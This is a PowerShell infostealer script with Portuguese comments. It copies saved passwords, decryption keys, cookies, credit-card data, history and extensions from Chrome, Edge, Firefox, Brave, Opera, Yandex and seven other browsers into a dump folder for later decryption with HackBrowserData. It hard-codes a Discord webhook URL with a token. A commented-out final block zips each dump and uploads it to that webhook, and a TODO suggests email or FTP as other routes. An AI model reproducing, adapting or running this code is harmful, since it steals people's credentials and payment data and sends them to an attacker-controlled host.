<#
    .DESCRIPTION

    Os arquivos copiados devem ser utilizados
    no app HackBrowser para realizar a descriptografia.

    https://github.com/moonD4rk/HackBrowserData
#>

$base_path = $env:USERPROFILE + "\AppData"
$webhook     = "https://discord.com/api/webhooks/1075986457958813806/kZtzOInNHBQxnRnOS0aoavmnN89EjmHVhJn_rlB1KOCPzJ_GqL0GG-N-3bgc3jCXG2cR"

New-Item "Dump" -itemType Directory

Function DumpEdge{
    
    $edgeProfilePath = $base_path + "\Local\Microsoft\Edge\User Data\Default\"
    
    if (Test-Path -Path $edgeProfilePath) {
        $fileChromiumKey          = $edgeProfilePath + "Local State"
        $fileChromiumCredit       = $edgeProfilePath + "Web Data"
        $fileChromiumPassword     = $edgeProfilePath + "Login Data"
        $fileChromiumHistory      = $edgeProfilePath + "History"
        $fileChromiumDownload     = $edgeProfilePath + "History"
        $fileChromiumCookie       = $edgeProfilePath + "Cookies"
        $fileChromiumBookmark     = $edgeProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $edgeProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $edgeProfilePath + "Extensions"
        
        New-Item "Dump\Edge" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Edge\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Edge\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Edge\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Edge\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Edge\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Edge\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Edge\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Edge\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Edge\Extensions"
    } else {
            
    }
}

Function DumpChrome{
    
    $chromeUserDataPath = $base_path + "\Local\Google\Chrome\User Data\Default\"
    
    if (Test-Path -Path $chromeUserDataPath) {
        $fileChromiumKey          = $chromeUserDataPath + "Local State"
        $fileChromiumCredit       = $chromeUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromeUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromeUserDataPath + "History"
        $fileChromiumDownload     = $chromeUserDataPath + "History"
        $fileChromiumCookie       = $chromeUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromeUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromeUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromeUserDataPath + "Extensions"

        New-Item "Dump\Chrome" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Chrome\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Chrome\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Chrome\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Chrome\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Chrome\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Chrome\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Chrome\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Chrome\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Chrome\Extensions"
    } else {
                
    }
}

Function DumpYandex{
    $yandexProfilePath = $base_path + "\Local\Yandex\YandexBrowser\User Data\Default\"

    if (Test-Path -Path $yandexProfilePath) {

        $fileYandexPassword = $yandexProfilePath + "Ya Passman Data"
        $fileYandexCredit   = $yandexProfilePath + "Ya Credit Cards"

        New-Item "Dump\Yandex" -itemType Directory

        Copy-Item -Path $fileYandexPassword -Destination "Dump\Yandex\Ya Passman Data"
        Copy-Item -Path $fileYandexCredit -Destination "Dump\Yandex\Ya Credit Cards"
    } else {
                 
    }
}

Function DumpFirefox{
    $firefoxProfilePath = $base_path + "\Roaming\Mozilla\Firefox\Profiles\"


    if (Test-Path -Path $firefoxProfilePath) {

        New-Item "Dump\Firefox" -itemType Directory

        Get-ChildItem -Path $firefoxProfilePath |
        Foreach-Object {
            $fileFirefoxKey4         = $firefoxProfilePath + $_.Name + "\key4.db"
            $fileFirefoxCookie       = $firefoxProfilePath + $_.Name + "\cookies.sqlite"
            $fileFirefoxPassword     = $firefoxProfilePath + $_.Name + "\logins.json"
            $fileFirefoxData         = $firefoxProfilePath + $_.Name + "\places.sqlite"
            $fileFirefoxLocalStorage = $firefoxProfilePath + $_.Name + "\webappsstore.sqlite"
            $fileFirefoxExtension    = $firefoxProfilePath + $_.Name + "\extensions.json"

            New-Item "Dump\Firefox\Profiles\$($_.Name)" -itemType Directory

            Copy-Item -Path $fileFirefoxKey4 -Destination "Dump\Firefox\Profiles\$($_.Name)\key4.db"
            Copy-Item -Path $fileFirefoxCookie -Destination "Dump\Firefox\Profiles\$($_.Name)\cookies.sqlite"
            Copy-Item -Path $fileFirefoxPassword -Destination "Dump\Firefox\Profiles\$($_.Name)\logins.json"
            Copy-Item -Path $fileFirefoxData -Destination "Dump\Firefox\Profiles\$($_.Name)\places.sqlite"
            Copy-Item -Path $fileFirefoxLocalStorage -Destination "Dump\Firefox\Profiles\$($_.Name)\webappsstore.sqlite"
            Copy-Item -Path $fileFirefoxExtension -Destination "Dump\Firefox\Profiles\$($_.Name)\extensions.json"
        }
    } else {
                        
    }

}

Function DumpChromeBeta{
    
    $chromeBetaUserDataPath = $base_path + "\Local\Google\Chrome Beta\User Data\Default\"
    
    if (Test-Path -Path $chromeBetaUserDataPath) {
        $fileChromiumKey          = $chromeBetaUserDataPath + "Local State"
        $fileChromiumCredit       = $chromeBetaUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromeBetaUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromeBetaUserDataPath + "History"
        $fileChromiumDownload     = $chromeBetaUserDataPath + "History"
        $fileChromiumCookie       = $chromeBetaUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromeBetaUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromeBetaUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromeBetaUserDataPath + "Extensions"
        
        New-Item "Dump\ChromeBeta" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\ChromeBeta\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\ChromeBeta\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\ChromeBeta\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\ChromeBeta\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\ChromeBeta\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\ChromeBeta\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\ChromeBeta\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\ChromeBeta\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\ChromeBeta\Extensions"
    } else {
                
    }
}

Function DumpChromium{
    
    $chromiumUserDataPath = $base_path + "\Local\Chromium\User Data\Default\"
    
    if (Test-Path -Path $chromiumUserDataPath) {
        $fileChromiumKey          = $chromiumUserDataPath + "Local State"
        $fileChromiumCredit       = $chromiumUserDataPath + "Web Data"
        $fileChromiumPassword     = $chromiumUserDataPath + "Login Data"
        $fileChromiumHistory      = $chromiumUserDataPath + "History"
        $fileChromiumDownload     = $chromiumUserDataPath + "History"
        $fileChromiumCookie       = $chromiumUserDataPath + "Cookies"
        $fileChromiumBookmark     = $chromiumUserDataPath + "Bookmarks"
        $fileChromiumLocalStorage = $chromiumUserDataPath + "Local Storage/leveldb"
        $fileChromiumExtension    = $chromiumUserDataPath + "Extensions"
        
        New-Item "Dump\Chromium" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Chromium\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Chromium\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Chromium\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Chromium\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Chromium\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Chromium\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Chromium\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Chromium\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Chromium\Extensions"
    } else {
                
    }
}

Function DumpBrave{
    
    $braveProfilePath = $base_path + "\Local\BraveSoftware\Brave-Browser\User Data\Default\"
    
    if (Test-Path -Path $braveProfilePath) {
        $fileChromiumKey          = $braveProfilePath + "Local State"
        $fileChromiumCredit       = $braveProfilePath + "Web Data"
        $fileChromiumPassword     = $braveProfilePath + "Login Data"
        $fileChromiumHistory      = $braveProfilePath + "History"
        $fileChromiumDownload     = $braveProfilePath + "History"
        $fileChromiumCookie       = $braveProfilePath + "Cookies"
        $fileChromiumBookmark     = $braveProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $braveProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $braveProfilePath + "Extensions"
        
        New-Item "Dump\Brave" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Brave\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Brave\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Brave\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Brave\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Brave\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Brave\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Brave\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Brave\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Brave\Extensions"
    } else {
                
    }
}

Function DumpSpeed360{
    
    $speed360ProfilePath = $base_path + "\Local\360chrome\Chrome\User Data\Default\"
    
    if (Test-Path -Path $speed360ProfilePath) {
        $fileChromiumKey          = $speed360ProfilePath + "Local State"
        $fileChromiumCredit       = $speed360ProfilePath + "Web Data"
        $fileChromiumPassword     = $speed360ProfilePath + "Login Data"
        $fileChromiumHistory      = $speed360ProfilePath + "History"
        $fileChromiumDownload     = $speed360ProfilePath + "History"
        $fileChromiumCookie       = $speed360ProfilePath + "Cookies"
        $fileChromiumBookmark     = $speed360ProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $speed360ProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $speed360ProfilePath + "Extensions"
        
        New-Item "Dump\Speed360" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Speed360\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Speed360\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Speed360\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Speed360\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Speed360\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Speed360\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Speed360\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Speed360\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Speed360\Extensions"
    } else {
                
    }
}

Function DumpQQBrowser{
    
    $qqBrowserProfilePath = $base_path + "\Local\Tencent\QQBrowser\User Data\Default\"
    
    if (Test-Path -Path $qqBrowserProfilePath) {
        $fileChromiumKey          = $qqBrowserProfilePath + "Local State"
        $fileChromiumCredit       = $qqBrowserProfilePath + "Web Data"
        $fileChromiumPassword     = $qqBrowserProfilePath + "Login Data"
        $fileChromiumHistory      = $qqBrowserProfilePath + "History"
        $fileChromiumDownload     = $qqBrowserProfilePath + "History"
        $fileChromiumCookie       = $qqBrowserProfilePath + "Cookies"
        $fileChromiumBookmark     = $qqBrowserProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $qqBrowserProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $qqBrowserProfilePath + "Extensions"
        
        New-Item "Dump\QQBrowser" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\QQBrowser\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\QQBrowser\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\QQBrowser\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\QQBrowser\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\QQBrowser\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\QQBrowser\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\QQBrowser\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\QQBrowser\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\QQBrowser\Extensions"
    } else {
                
    }
}

Function DumpOpera{
    
    $operaProfilePath = $base_path + "\Roaming\Opera Software\Opera Stable\"
    
    if (Test-Path -Path $operaProfilePath) {
        $fileChromiumKey          = $operaProfilePath + "Local State"
        $fileChromiumCredit       = $operaProfilePath + "Web Data"
        $fileChromiumPassword     = $operaProfilePath + "Login Data"
        $fileChromiumHistory      = $operaProfilePath + "History"
        $fileChromiumDownload     = $operaProfilePath + "History"
        $fileChromiumCookie       = $operaProfilePath + "Cookies"
        $fileChromiumBookmark     = $operaProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $operaProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $operaProfilePath + "Extensions"
        
        New-Item "Dump\Opera" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Opera\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Opera\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Opera\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Opera\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Opera\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Opera\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Opera\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Opera\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Opera\Extensions"
    } else {
                
    }
}

Function DumpOperaGX{
    
    $operaGXProfilePath = $base_path + "\Roaming\Opera Software\Opera GX Stable\"
    
    if (Test-Path -Path $operaGXProfilePath) {
        $fileChromiumKey          = $operaGXProfilePath + "Local State"
        $fileChromiumCredit       = $operaGXProfilePath + "Web Data"
        $fileChromiumPassword     = $operaGXProfilePath + "Login Data"
        $fileChromiumHistory      = $operaGXProfilePath + "History"
        $fileChromiumDownload     = $operaGXProfilePath + "History"
        $fileChromiumCookie       = $operaGXProfilePath + "Cookies"
        $fileChromiumBookmark     = $operaGXProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $operaGXProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $operaGXProfilePath + "Extensions"
        
        New-Item "Dump\OperaGX" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\OperaGX\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\OperaGX\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\OperaGX\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\OperaGX\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\OperaGX\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\OperaGX\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\OperaGX\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\OperaGX\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\OperaGX\Extensions"
    } else {
         
    }
}

Function DumpVivaldi{
    
    $vivaldiProfilePath = $base_path + "\Local\Vivaldi\User Data\Default\"
    
    if (Test-Path -Path $vivaldiProfilePath) {
        $fileChromiumKey          = $vivaldiProfilePath + "Local State"
        $fileChromiumCredit       = $vivaldiProfilePath + "Web Data"
        $fileChromiumPassword     = $vivaldiProfilePath + "Login Data"
        $fileChromiumHistory      = $vivaldiProfilePath + "History"
        $fileChromiumDownload     = $vivaldiProfilePath + "History"
        $fileChromiumCookie       = $vivaldiProfilePath + "Cookies"
        $fileChromiumBookmark     = $vivaldiProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $vivaldiProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $vivaldiProfilePath + "Extensions"
        
        New-Item "Dump\Vivaldi" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Vivaldi\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Vivaldi\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Vivaldi\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Vivaldi\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Vivaldi\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Vivaldi\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Vivaldi\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Vivaldi\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Vivaldi\Extensions"
    } else {
                
    }
}

Function DumpCoccoc{
    
    $coccocProfilePath = $base_path + "\Local\CocCoc\Browser\User Data\Default\"
    
    if (Test-Path -Path $coccocProfilePath) {
        $fileChromiumKey          = $coccocProfilePath + "Local State"
        $fileChromiumCredit       = $coccocProfilePath + "Web Data"
        $fileChromiumPassword     = $coccocProfilePath + "Login Data"
        $fileChromiumHistory      = $coccocProfilePath + "History"
        $fileChromiumDownload     = $coccocProfilePath + "History"
        $fileChromiumCookie       = $coccocProfilePath + "Cookies"
        $fileChromiumBookmark     = $coccocProfilePath + "Bookmarks"
        $fileChromiumLocalStorage = $coccocProfilePath + "Local Storage/leveldb"
        $fileChromiumExtension    = $coccocProfilePath + "Extensions"
        
        New-Item "Dump\Coccoc" -itemType Directory

        Copy-Item -Path $fileChromiumKey -Destination "Dump\Coccoc\Local State"
        Copy-Item -Path $fileChromiumCredit -Destination "Dump\Coccoc\Web Data"
        Copy-Item -Path $fileChromiumPassword -Destination "Dump\Coccoc\Login Data"
        Copy-Item -Path $fileChromiumHistory -Destination "Dump\Coccoc\History"
        Copy-Item -Path $fileChromiumDownload -Destination "Dump\Coccoc\History"
        Copy-Item -Path $fileChromiumCookie -Destination "Dump\Coccoc\Cookies"
        Copy-Item -Path $fileChromiumBookmark -Destination "Dump\Coccoc\Bookmarks"
        Copy-Item -Path $fileChromiumLocalStorage -Recurse "Dump\Coccoc\Local Storage\leveldb"
        Copy-Item -Path $fileChromiumExtension -Destination "Dump\Coccoc\Extensions"
    } else {
                
    }
}

DumpChrome
DumpChromeBeta
DumpEdge
DumpChromium
DumpBrave
DumpSpeed360
DumpQQBrowser
DumpOpera
DumpOperaGX
DumpVivaldi
DumpCoccoc
DumpYandex
DumpFirefox

<#

.DESCRIPTION
TODO: Enviar os arquivos copiados para algum local remoto, como por
exemplo: Email, FTP...

Get-ChildItem -Path "Dump" |
Foreach-Object {

    Compress-Archive -Path "Dump\$($_)" -DestinationPath "$($_).zip"

    # SEND DATA TO DISCORD
    $fileBytes = [System.IO.File]::ReadAllBytes("$($_).zip");
    $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
    $boundary = [System.Guid]::NewGuid().ToString(); 
    $LF = "`r`n";
    $bodyLines = ( 
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$($_).zip`";",
        "Content-Type: application/octet-stream$LF",
        $fileEnc,
        "--$boundary--$LF" 
    ) -join $LF

    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
}

#>

